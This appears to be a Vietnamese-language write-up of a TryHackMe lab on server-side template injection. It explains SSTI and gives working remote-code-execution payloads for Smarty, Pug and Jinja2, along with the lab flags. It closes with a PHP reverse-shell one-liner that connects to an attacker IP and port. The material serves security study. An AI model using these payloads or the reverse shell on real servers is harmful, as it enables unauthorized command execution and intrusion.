# SSTI 

- Server-side Template Injection(SSTI) là lỗ hổng xảy ra khi người dùng nhập vào dữ liệu tích hợp không an toàn vào phía Server-side template. Cho phép kẻ tấn công tiêm và thực thi mã tùy ý trên máy chủ.

- `Dynamic Content Generation`: Công cụ mẫu thay thế trình giữ chỗ bằng dữ liệu thực, cho phép ứng dụng tạo các trang HTML động. Quá trình này có thể bị khai thác nếu dữ liệu đầu vào của người dùng không được khử trùng đúng cách.

- `User input as Template code`:  Khi đầu vào của người dùng được coi là một phần của mã mẫu, chúng có thể đưa logic có hại vào đầu ra được hiển thị, dẫn đến SSTI.

- Luông tấn cồng SSTI:

![image](https://github.com/user-attachments/assets/c0f8559e-2f9d-45cd-9580-721a7e268546)

- Khi dữ liệu đầu vào của người dùng được nhứng trực tiếp vào template mà không có validation hay escaping đúng cách, kẻ tấn công có thể tạo ra các payload làm thay đổi hành vi của template.

- Template engine là một phần không thể thiếu của phát triển web hiện đại, cho phép các nhà phát triển tạo nội dung HTML động bằng cách kết hợp các mẫu với dữ liệu. Sau đây là một số template engine được sử dụng phổ biến nhất:

  - Jinja2 : Rất phổ biến trong các ứng dụng Python, được biết đến với khả năng biểu đạt và kết xuất mạnh mẽ.
 
  - Twig : Công cụ tạo mẫu mặc định cho Symfony trong PHP , Twig cung cấp một môi trường mạnh mẽ với các thiết lập mặc định an toàn.
 
  - Pug/Jade : Được biết đến với cú pháp mẫu HTML tối giản và gọn gàng, Pug/Jade rất phổ biến trong giới các nhà phát triển Node.js.
 
# Challenge

## PHP-Smarty

- Một số phương thức định dạng cơ bản:

  - {$tile|upper} viết hoa $title
 
  - {$tile|lower} viết thường $title
 
  - {$tile|strip_tags} Định dạng bỏ kí tự đặc biệt $title
 
  - {system("ls")} hoặc {system("dir")} sẽ gọi trực tiếp hàm system của php

![image](https://github.com/user-attachments/assets/970e1035-4227-4d6f-918e-d9de4fab7aec)

![image](https://github.com/user-attachments/assets/07aaf07d-d4d0-4019-98de-06481cd019b7)

![image](https://github.com/user-attachments/assets/215a2db9-d568-4277-a4d7-65b6101b40ac)

- flag: `THM{0739eea78f5c7f4b1690737c6258e38b}`

## NodeJS-Pug

- Các lỗ hổng bảo mật của Pug chủ yếu xuất phát từ khả năng nội suy mã JavaScript trong các biến mẫu. Tính năng này, được thiết kế để tạo nội dung động, có thể bị khai thác một cách độc hại nếu dữ liệu đầu vào của người dùng được nhúng vào mẫu mà không được khử trùng đúng cách

- Các điểm dễ bị tổn thương chính:

  - Nội suy JavaScript : Pug cho phép nhúng JavaScript trực tiếp vào các mẫu bằng cách sử dụng dấu ngoặc nhọn nội suy #{}. Nếu dữ liệu đầu vào của người dùng được nội suy mà không có quá trình khử trùng thích hợp, có thể dẫn đến việc thực thi mã tùy ý.

  - Thoát mặc định : Pug cung cấp chức năng thoát tự động cho một số đầu vào nhất định, chuyển đổi các ký tự như <, >, và &thành các thực thể HTML tương đương để ngăn chặn các cuộc tấn công XSS. Tuy nhiên, hành vi mặc định này không giải quyết được tất cả các vấn đề bảo mật tiềm ẩn, đặc biệt là khi xử lý nội suy không thoát !{}hoặc các tình huống nhập phức tạp.

![image](https://github.com/user-attachments/assets/4fcafb72-fa27-4e69-9fb6-62c122cc2d9c)

- Vì Pug cho phép nội suy JavaScript, sau đó chúng ta có thể sử dụng tải trọng `#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}`

  - root.process truy cập đối tượng toàn cục từ Node.js trong Pug
 
  - mainModule.require('child_process') yêu cầu module child_process trong Node.js

  - spawnSync('ls'): Chạy lệnh ls (liệt kê file) trên hệ thống.

  - .stdout: Lấy đầu ra của lệnh ls để hiển thị trên template.

![image](https://github.com/user-attachments/assets/b7076076-5f5a-46f0-8ee0-81ab3288a6af)

  - Chức năng này `spawnSync` được thiết kế để thực thi lệnh trong shell và cung cấp khả năng kiểm soát chi tiết đối với đầu vào và đầu ra của lệnh. Đây là một phần của child_processmô-đun Node.js, cho phép Node.js thực thi các quy trình khác trên hệ thống nơi nó đang chạy.

    - spawnSync(command, [args], [options])

  - command : lệnh

  - args: mảng các đối số chuỗi để truyền vào lệnh.

  - options:  Đây là tham số tùy chọn có thể chỉ định nhiều tùy chọn khác nhau như thư mục làm việc, biến môi trường, đầu vào, đầu ra, thời gian chờ, v.v.

![image](https://github.com/user-attachments/assets/bdae10b2-4991-4787-918e-87ac677c2483)

![image](https://github.com/user-attachments/assets/6bee6da5-47e2-4228-855a-07e86c4fce6e)

- flag: `THM{1f8c3b32ad3217e84c145398bae00876}`

## Python-Jinja2

- Các điểm dễ bị tổn thương chính:

  - Đánh giá biểu thức : Jinja2 đánh giá các biểu thức trong dấu ngoặc nhọn {{ }}, có thể thực thi mã Python tùy ý nếu được tạo ra một cách độc hại.

  - Kế thừa và nhập mẫu : Các tính năng nâng cao như kế thừa mẫu và nhập macro có thể bị sử dụng sai mục đích để thực thi mã không mong muốn, dẫn đến tiết lộ thông tin hoặc thao túng máy chủ.

![image](https://github.com/user-attachments/assets/fc718ea8-595d-49e4-84b8-d0d4e40d558f)

- `"".__class__.__mro__[1].__subclasses__()`: lấy danh sách tất cả các lớp con của `object`

![image](https://github.com/user-attachments/assets/0a415e30-a9d4-49bb-9eb8-6985047cab1a)

![image](https://github.com/user-attachments/assets/4aaabe70-a2aa-4ba2-b174-074394a99e8c)

- `{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}`

- `__class__.__mro__[1].__subclasses__()[157]` lấy phần tử 157, ở đây là `<class 'subprocess.Popen'>` `.__repr__.__globals__` → Truy cập vào namespace toàn cục của class.

- `.get("__builtins__").get("__import__")` Lấy module builtins, nơi chứa các hàm gốc của Python như open(), eval(), exec(), import(). `.get("__import__")("subprocess")` → Dùng __import__("subprocess") để import module subprocess

- `.check_output("ls")` chạy lệnh ls

![image](https://github.com/user-attachments/assets/af0a6ecc-e02c-438f-bdfc-8baa0345d55d)

- Cú pháp check_out(): `subprocess.check_output([command, arg1, arg2])`
  
![image](https://github.com/user-attachments/assets/65092b84-fe6c-4978-9824-c2e59373a770)

- flag: `THM{ecc43642dd6934d37c69598174e6e126}`

## Extra-Mile

- Tạo form, chuyển đến Views và add new group tạo group với payload {{2*2}} và update:

![image](https://github.com/user-attachments/assets/f98d70b2-b742-4a45-ae2e-675b8adc9398)

![image](https://github.com/user-attachments/assets/bec5baa1-b32c-4b04-9e7a-ff175ea0f5a9)

- nhấn update:

![image](https://github.com/user-attachments/assets/87a49563-e889-449d-ac2b-a7993ce5afc5)

- chèn {{exec('id')}}
  
![image](https://github.com/user-attachments/assets/bbab8633-05a6-4e1d-a046-832c7751f967)

![image](https://github.com/user-attachments/assets/00090a83-4c88-4f26-9178-7bccf6279c9c)

![image](https://github.com/user-attachments/assets/4baf45f5-2b34-4aaa-aa18-4122a970ee84)

![image](https://github.com/user-attachments/assets/2c75df31-753f-4680-972d-1c7244bbbe7a)

==> có thể thực thi php

- tạo reverse shell bằng php: `{{exec("php -r  '\$sock=fsockopen(\"10.11.129.40\",4444);\$proc=proc_open(\"/bin/sh\",[0=>\$sock,1=>\$sock,2=>\$sock],\$pipes);'")}}'`

![image](https://github.com/user-attachments/assets/817d7e63-2887-4338-a6d7-0ca26b49644e)

![image](https://github.com/user-attachments/assets/a9fcf658-0fc8-48a7-aa01-8a327632dbdd)

![image](https://github.com/user-attachments/assets/2a14d750-4b05-411d-bf52-c8effce2b1e8)

- flag: `THM{w0rK1Ng_sST1}`




